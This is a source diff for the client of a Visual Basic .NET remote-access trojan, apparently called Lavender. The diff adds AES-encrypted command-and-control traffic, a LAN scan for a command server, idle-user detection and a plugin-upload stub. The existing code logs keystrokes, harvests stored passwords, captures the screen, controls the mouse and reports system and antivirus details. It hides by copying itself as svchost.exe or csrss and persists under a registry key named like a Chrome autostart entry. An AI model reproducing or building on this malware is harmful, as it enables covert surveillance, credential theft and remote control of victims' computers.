@@ -6,6 +6,7 @@ Imports System.Timers
 Imports System.Text
 Imports System.ComponentModel
 Imports System.Security.Principal
+Imports System.DirectoryServices
 
 Public Class Main
 
@@ -46,17 +47,21 @@ Public Class Main
     ''' <summary>
     ''' Naming prefix
     ''' </summary>
-    Public Shadows name As String
+    Public Shadows cname As String
     ''' <summary>
     ''' Copy payload
     ''' </summary>
     Public copyse As Boolean = 0
     ''' <summary>
+    ''' Scan LAN for CC
+    ''' </summary>
+    Public LANScan As Boolean = False
+    ''' <summary>
     ''' Name of executable file
     ''' </summary>
     Public sernam As String
     ''' <summary>
-    ''' Add to stratup
+    ''' Add to system/startup
     ''' </summary>
     Public addtos As Boolean = 0
     ''' <summary>
@@ -68,9 +73,18 @@ Public Class Main
     ''' </summary>
     Public melts As Boolean = 0
     ''' <summary>
-    ''' Cureent RC4 password
+    ''' Current AES password
     ''' </summary>
     Public Shared pw As String
+    ''' <summary>
+    ''' Current AES password
+    ''' </summary>
+    ''' 
+    Public Shared salt As String
+    ''' <summary>
+    ''' Encryptor instance
+    ''' </summary>
+    Public Shared cryptor As Crypt.Aes256Base64Encrypter
     ''' <summary>
     ''' RSA Public Key
     ''' </summary>
@@ -114,11 +128,21 @@ Public Class Main
     ''' <summary>
     ''' Keylogger data file extension
     ''' </summary>
-    Dim klfext As String = ".cab"
+    Public klfext As String = ".cab"
     ''' <summary>
     ''' Keylogger instance
     ''' </summary>
     Dim o As New KLogger
+    ''' <summary>
+    ''' Directory of exe
+    ''' </summary>
+    Dim exePath As String = System.IO.Path.GetDirectoryName(
+    System.Reflection.Assembly.GetExecutingAssembly().CodeBase)
+    ''' <summary>
+    ''' Information about last computer input
+    ''' </summary>
+    Dim lastInputInf As New LASTINPUTINFO()
+    Private Shared syncl As New Object '<-- global
 #End Region
 
 #Region "DLL Functions"
@@ -139,6 +163,12 @@ Public Class Main
     Public Shared WTS_CURRENT_SERVER_HANDLE As IntPtr = IntPtr.Zero
     Public Shared WTS_CURRENT_SESSION As Integer = -1
     Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
+    <DllImport("user32.dll")> Shared Function GetLastInputInfo(ByRef plii As LASTINPUTINFO) As Boolean
+    End Function
+    <StructLayout(LayoutKind.Sequential)> Structure LASTINPUTINFO
+        <MarshalAs(UnmanagedType.U4)> Public cbSize As Integer
+        <MarshalAs(UnmanagedType.U4)> Public dwTime As Integer
+    End Structure
 #End Region
 
     ''' <summary>
@@ -161,49 +191,40 @@ Public Class Main
         'Me.TopMost = False
         ''temporary preferences
         HOST = "127.0.0.1" ''IP
+        LANScan = True
         port = 92 ''Port
-        name = "Wonder" & "_" & HWD() ''Client Name
+        cname = "LavenderTest" ''Client Name
         copyse = False ''Copy (to temp)
-        'serfol = alaa(5)
         sernam = "null" ''copy name (server name)
         addtos = False ''add to startup
-        StartupKey = "null" ''startup key name
+        StartupKey = "lavendertesting" ''startup key name
         melts = "False" ''melt
         pk = "<RSAKeyValue><Modulus>oQS+MurZhAp2kYh7VWeyMZrwYmmpW5GYW+WW2V74YZqobBYkD6gTnI0XfOL2NRtv46IgYPZvB7mWG7af+hAYkb+0uUu/8DGJ2VAV1AyEKAzrv0bzXk10n28npYuE5jBvACl1Im+LNG8lgcNZe8AkPa1eVN6HrziD8GDgF+Ib+XCnUcA3piFf3mleVvyK2svUO2dFb2rYJTLpnIRkHHlO9wSbHIT51hcMmy9mZIG/O2xR7smtKHwEDFDIUor6BhCiWM2BBcHPzQEcL7qBL1Tie9Kd8CAB2YMRybaEWvU1rS1WNf+CBN2eWNGd3H5GTn8enZjG5szr7C5UV8HYDRPUGrnTsfVUUVQKKnn+DR4RusegfsWLCuIhfKkrZZWDmhw/WWgZWiAvbNl51rsqD1Cr8ILcOTgaOztXSoC0NkVCzDiNIqqeSZ+LhT+ML8G3TLe0C2noYomBEcG2QogC462dgT7mTO0OYaUnhV9DTiU0pPj9bXYfotnL0sLPM/FXBTK3O41resBiEeOKi2qMHsIQCyNRY7PnuFeb/y7MMWv+QPpGlcZoiN6t8ntoIZlYSdmVaAy8qOVs0Vfh8ZICXjkvmv68JnSCCOezbjxMOCiVbTpxxcDKThom1Km6n3gBOhuZjd6QJeXZwnQBpsKRcFD0UxkzlltaMFPItu3RyhAI/90=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>" ''public key
-
-        ConTimer = New Timers.Timer(5000) ''timer connection to client interval 5s
+        ConTimer = New Timers.Timer(2000) ''timer connection to client interval 5s
         ServeTimer = New Timers.Timer(5000) ''timer connection to webserver interval 5s
 #Else
         Me.Hide()
         Me.ShowInTaskbar = False
         Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
         Me.Visible = False
+        HOST = "127.0.0.1" ''IP
+        LANScan = True
+        port = 92 ''Port
+        name = "ISSH" ''Campaign name
+        copyse = True ''Copy (to temp)
+        sernam = "csrss" ''copy name (exe name)
+        addtos = True ''add to system
+        StartupKey = "GoogleChromeAutoLaunch_3244AC00F24414D33671F7B36CA62ABE" ''startup key name
+        melts = True ''melt
 
-        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
-        text1 = Space(LOF(1))
-        text2 = Space(LOF(1))
-        FileGet(1, text1)
-        FileGet(1, text2)
-        FileClose()
-        prfs = Split(text1, spl)
-        ''ip + port + campaign name + copy checkbox + copy name + add to startup + startup key name + melt checkbox + password
-        HOST = prfs(1) ''IP
-        port = prfs(2) ''Port
-        name = prfs(3) ''Campaign name
-        copyse = prfs(4) ''Copy (to temp)
-        'serfol = alaa(5)
-        sernam = prfs(5) ''copy name (server name)
-        addtos = prfs(6) ''add to startup
-        StartupKey = prfs(7) ''startup key name
-        melts = prfs(8) ''melt
-        ConTimer = New Timers.Timer(5000) ''timer connection interval
-
-        If Not IO.Directory.Exists(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) Then
-            IO.Directory.CreateDirectory(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
-        End If
-
-
+        ConTimer = New Timers.Timer(5000) ''timer connection to client interval 5s
+        ServeTimer = New Timers.Timer(5000) ''timer connection to webserver interval 5s
 #End If
+        'If Not IO.Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)) Then
+        '    IO.Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))
+        'End If
+
+        cname += "_" & HWD()
         C = New SocketClient
         ForeTimer = New Timers.Timer(1000)
         ConTimer.Start()
@@ -237,21 +258,21 @@ Public Class Main
         '-----------------------------MELT
         Try
             If melts Then
-                If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
+                If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe" Then
                     If File.Exists(Path.GetTempPath & "melt.txt") Then
                         Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                     End If
                 Else
-                    If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") Then
-                        Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") : Catch : End Try
-                        IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
+                    If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe") Then
+                        Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe") : Catch : End Try
+                        IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe")
                         IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
-                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
+                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe")
                         End
                     Else
-                        IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
+                        IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe")
                         IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
-                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
+                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe")
                         End
                     End If
                 End If
@@ -259,41 +280,41 @@ Public Class Main
         Catch ex As Exception
 
         End Try
-        '---------------------------COPY WTF basically the same as melt!
+        ''---------------------------COPY WTF basically the same as melt!
         ''TODO: Make more advanced (see docs)
-        If copyse Then
-            If Application.ExecutablePath = Path.GetTempPath & sernam & ".exe" Then
-                If File.Exists(Path.GetTempPath & "melt.txt") Then
-                    '   Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
-                End If
-            Else
-                If File.Exists(Path.GetTempPath & sernam & ".exe") Then
-                    Try : IO.File.Delete(Path.GetTempPath & sernam & ".exe") : Catch : End Try
-                    IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
-                    'IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
-                    Process.Start(Path.GetTempPath & sernam & ".exe")
-                    End
-                Else
-                    IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
-                    'IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
-                    Process.Start(Path.GetTempPath & sernam & ".exe")
-                    End
-                End If
-            End If
-        End If
+        'If copyse Then
+        '    If Application.ExecutablePath = Path.GetTempPath & sernam & ".exe" Then
+        '        If File.Exists(Path.GetTempPath & "melt.txt") Then
+        '            '   Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
+        '        End If
+        '    Else
+        '        If File.Exists(Path.GetTempPath & sernam & ".exe") Then
+        '            Try : IO.File.Delete(Path.GetTempPath & sernam & ".exe") : Catch : End Try
+        '            IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
+        '            'IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
+        '            Process.Start(Path.GetTempPath & sernam & ".exe")
+        '            End
+        '        Else
+        '            IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
+        '            'IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
+        '            Process.Start(Path.GetTempPath & sernam & ".exe")
+        '            End
+        '        End If
+        '    End If
+        'End If
 
 
         ''add to start
-        If addtos Then
-            Try
-                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
-                regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
-            Catch : End Try
-        End If
+        'If addtos Then
+        '    Try
+        '        Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
+        '        regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
+        '    Catch : End Try
+        'End If
 
-        gpasswords = A.GT ''passwords and stuff
+        gpasswords = Passwords.GT ''passwords and stuff
 
-        o.Start() ''keylogger
+            o.Start() ''keylogger
 
         With cpu
             .CategoryName = "Processor"
@@ -329,7 +350,9 @@ Public Class Main
     End Sub
     Private Sub Disconnected() Handles C.Disconnected
         If trust Then
+#If DEBUG Then
             InfoLabel.Text = "Disconnected"
+#End If
             C = New SocketClient
             ConTimer.Enabled = True
             ConTimer.Start()
@@ -346,12 +369,22 @@ Public Class Main
     Public errorcount As Boolean = 0
     Dim kg As Crypt.RandomKeyGenerator = New Crypt.RandomKeyGenerator
 
+    Sub GenPass()
+        kg.KeyLetters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        kg.KeyNumbers = "0123456789"
+        kg.KeyChars = 16 ''length can be changed
+        pw = kg.Generate()
+#If DEBUG Then
+        InfoLabel.Text = pw
+#End If
+    End Sub
+
 
     Private Sub Data(ByVal b As Byte()) Handles C.Data
         Try
             Dim T As String
-            If trust Then
-                T = Crypt.RC4.rc4(BS(b), pw)
+            If trust And Not BS(b).StartsWith(n.getscreen) Then
+                T = cryptor.Decrypt(BS(b), pw)
             Else
                 T = BS(b)
             End If
@@ -359,17 +392,20 @@ Public Class Main
             Dim A As String() = Split(T, Sep)
             If Not trust Then
                 If A(0) = n.connect Then ''first connect
-                    kg.KeyLetters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-                    kg.KeyNumbers = "0123456789"
-                    kg.KeyChars = 16 ''length can be changed
-                    pw = kg.Generate()
-                    InfoLabel.Text = pw
-                    C.Send(n.connect & Sep & Crypt.RSA.Encrypt(pw, pk).AsBase64String)
+                    GenPass()
+                    cryptor = New Crypt.Aes256Base64Encrypter(cname) ''name is salt (todo: something more unique to the session?)
+                    C.Send(n.connect & Sep & Crypt.RSA.Encrypt(cname & Sep & pw, pk).AsBase64String)
                 ElseIf A(0) = n.response ''recieve key response
                     If A(1) = Crypt.HMACSHA512Hasher.Base64Hash(pw) Then
                         C.Send(n.response) ''report sucessful authentication
                         trust = True ''above is the final unencrypted message
+#If DEBUG Then
                         InfoLabel.Text = "Authenticated"
+#End If
+                        ''Dim gid As String = TODO: unique id
+                        ''HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices\\DosDevices\C:
+                        ''TODO: Add userRole
+                        C.Send(n.getinfo & Sep & cname & Sep & pc & Sep & country & Sep & My.Computer.Info.OSFullName & " (" & My.Computer.Info.OSVersion & ")" & Sep & getanti())
                     Else
                         errorcount += 1
                     End If
@@ -377,7 +413,9 @@ Public Class Main
                     errorcount += 1
                 End If
                 If errorcount >= 3 Then
+#If DEBUG Then
                     InfoLabel.Text = "Too many failed auths, disconnecting"
+#End If
                     C.DisConnect() ''disconnect if failed 3 or more times
                 End If
             Else
@@ -415,11 +453,6 @@ B:
                         Catch
                             GoTo B
                         End Try
-                    Case n.getinfo ' information
-                        ''Dim gid As String = TODO: unique id
-                        ''HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices\\DosDevices\C:
-                        ''TODO: Add userRole
-                        C.Send(n.getinfo & Sep & name & Sep & pc & Sep & country & Sep & My.Computer.Info.OSFullName & " (" & My.Computer.Info.OSVersion & ")" & Sep & getanti())
                     Case n.uninstall ''todo: improve
                         Try
                             Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
@@ -428,6 +461,13 @@ B:
                         Catch ex As Exception
                         End Try
                         End
+                    Case n.upload ''upload recieve
+                        Select Case A(1)
+                            Case n.plugin ''load plugin
+
+                            Case Else ''recieve file
+
+                        End Select
                     Case n.openscreen ' server ask for my screen Size
                         CRDP.Clear()
                         Dim s = CRDP.cscreen.Bounds.Size
@@ -444,16 +484,23 @@ B:
                         CRDP.cscreen = scr
                         C.Send(n.changescreen & Sep & scr.Bounds.Size.Width & Sep & scr.Bounds.Size.Height)
                     Case n.getscreen ' Start/Get Capture
-                        Dim SizeOfimage As Integer = A(1)
-                        Dim Split As Integer = A(2)
-                        Dim Quality As Integer = A(3)
-                        Dim Bb As Byte() = CRDP.Cap(SizeOfimage, Split, Quality)
-                        Dim M As New IO.MemoryStream
-                        Dim CMD As String = n.getscreen & Sep
-                        M.Write(SB(CMD), 0, CMD.Length)
-                        M.Write(Bb, 0, Bb.Length)
-                        C.Send(M.ToArray) ''no rc4!
-                        M.Dispose()
+                        Try
+                            Dim SizeOfimage As Integer = A(1)
+                            Dim Split As Integer = A(2)
+                            Dim Quality As Integer = A(3)
+                            Dim Bb As Byte() = CRDP.Cap(SizeOfimage, Split, Quality)
+                            Dim M As New IO.MemoryStream
+                            Dim CMD As String = n.getscreen & Sep
+                            M.Write(SB(CMD), 0, CMD.Length)
+                            M.Write(Bb, 0, Bb.Length)
+                            C.Send(M.ToArray) ''no encryption!
+                            M.Dispose()
+                        Catch ex As Exception
+#If DEBUG Then
+                            MsgBox(ex.Message & vbNewLine & ex.StackTrace)
+#End If
+                        End Try
+
                     Case n.mouseclick ' mouse clicks
                         Cursor.Position = New Point(A(1), A(2))
                         mouse_event(A(3), 0, 0, 0, 0)
@@ -543,7 +590,9 @@ B:
                                     clarr_pid(i) = mgmtObj.GetPropertyValue("ProcessId")
                                     clarr_cl(i) = mgmtObj.GetPropertyValue("CommandLine")
                                 Catch ex As Exception
+#If DEBUG Then
                                     MsgBox(ex.Message & vbNewLine & ex.StackTrace)
+#End If
                                     clarr_pid(i) = ""
                                     clarr_cl(i) = ""
                                 End Try
@@ -562,7 +611,9 @@ B:
                                     cparr_pid(i) = mgmtObj.GetPropertyValue("IDProcess")
                                     cparr_percent(i) = mgmtObj.GetPropertyValue("PercentProcessorTime")
                                 Catch ex As Exception
+#If DEBUG Then
                                     MsgBox(ex.Message & vbNewLine & ex.StackTrace)
+#End If
                                     cparr_pid(i) = ""
                                     cparr_percent(i) = ""
                                 End Try
@@ -573,8 +624,9 @@ B:
                         End Try
 
                         For Each Proc As Process In ProcessList
+#If DEBUG Then
                             InfoLabel.Text = "proc:  " & Proc.ProcessName
-
+#End If
                             If Proc.Responding Then
                                 responding = ""
                             Else
@@ -687,7 +739,7 @@ B:
                         C.Send(n.openklog)
                     Case n.getklog ''ket keylogs
                         Try
-                            C.Send(n.getklog & Sep & o.Logs)
+                            C.Send(n.getklog & Sep & Xord(o.Logs, Crypt.Crc32.ComputeChecksum(SB(KLogger.modulus))))
                         Catch ex As Exception
                             C.Send(n.exception & Sep & ex.Message)
                         End Try
@@ -711,10 +763,8 @@ B:
                     Case n.message ''show message
                         Try
                             WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, " ", 1, A(1), A(1).Length, A(2), Nothing, Nothing, False)
-                            ''RunPE.Run("C:\Program Files (x86)\Internet Explorer\iexplore.exe", "@#@" & A(1) & "@#@" & A(2), My.Resources.MessageMaker, False) ''ToDO Change path!
                         Catch ex As Exception
                             C.Send(n.exception & Sep & ex.Message)
-                            ''MsgBox("RunPE fail: " & ex.Message) ''todo: remove
                         End Try
 
                     Case n.getspecs ''system specs TODO!
@@ -788,7 +838,9 @@ B:
                 End Select
             End If
         Catch ex As Exception
-            MsgBox(ex.Message & vbNewLine & ex.StackTrace) ''TODO: ABSOLUTELY REMOVE!
+#If DEBUG Then
+            MsgBox(ex.Message & vbNewLine & ex.StackTrace)
+#End If
         End Try
     End Sub
     Private Sub ex() ''exit shell
@@ -831,18 +883,51 @@ B:
 
                 ForeTimer.Start()
             End If
+
+            ''http://www.dreamincode.net/forums/topic/314096-using-getlastinputinfo-with-user-inactivity/
+            lastInputInf.cbSize = Marshal.SizeOf(lastInputInf)
+            lastInputInf.dwTime = 0
+            GetLastInputInfo(lastInputInf)
+            ''Label1.Text = CInt((Environment.TickCount - lastInputInf.dwTime) / 1000).ToString
+            If CInt((Environment.TickCount - lastInputInf.dwTime) / 1000) >= 10 Then 'check if it has been 60 seconds
+                'if no user input is detected in last 10s
+                C.Send(n.status & Sep & 1)
+            Else
+                C.Send(n.status & Sep & 0)
+            End If
         Else
             ''InfoLabel.Text = "Forewindows timer bad:" & inc
             inc += 1
+            ''MsgBox("2")
             C.DisConnect()
         End If
     End Sub
 
     Private Sub ConTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs)  ''5000
-        Me.InfoLabel.Text = "attempt con:" & inc
+#If DEBUG Then
+        InfoLabel.Text = "attempt con:" & inc
+#End If
         inc += 1
         If C.Statconnected = False Then ''attempt connection
-            C.Connect(HOST, port)
+            Try
+                If LANScan Then
+                    For Each computer As String In NetApi32.GetAllComputersInDomain
+                        If C.Statconnected = False Then
+                            Try
+                                C.Connect(computer, port)
+                            Catch ex As Exception
+                            End Try
+                        End If
+                    Next
+                End If
+            Catch ex As Exception
+#If DEBUG Then
+                MsgBox(ex.Message & vbNewLine & ex.StackTrace)
+#End If
+            End Try
+            If C.Statconnected = False Then
+                C.Connect(HOST, port)
+            End If
         End If
     End Sub
     Private Sub ServeTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs) ''connect to lavender web
@@ -850,10 +935,10 @@ B:
         Dim response As String
         Try
             ''todo add https
-            response = WRequest("http://" & HOST & "/index.php", "0x1", "POST", "id=" & Crypt.AES.Encrypt(name, "hinki", Crypt.AES.salt, "SHA1", 1000, Crypt.AES.IV, 256) & "&iv=" & Crypt.AES.IV)
+            ''response = WRequest("https://" & HOST & "/index.php", "0x1", "POST", "id=" & Crypt.AES.Encrypt(name, "hinki", Crypt.AES.salt, "SHA1", 1000, Crypt.AES.IV, 256) & "&iv=" & Crypt.AES.IV)
         Catch : End Try
-        ''MsgBox(response)
-        Me.InfoLabel.Text = "WebRequest: " & response
+        'MsgBox(response)
+        ''Me.InfoLabel.Text = "WebRequest: " & response
     End Sub
 
     ''' <summary>
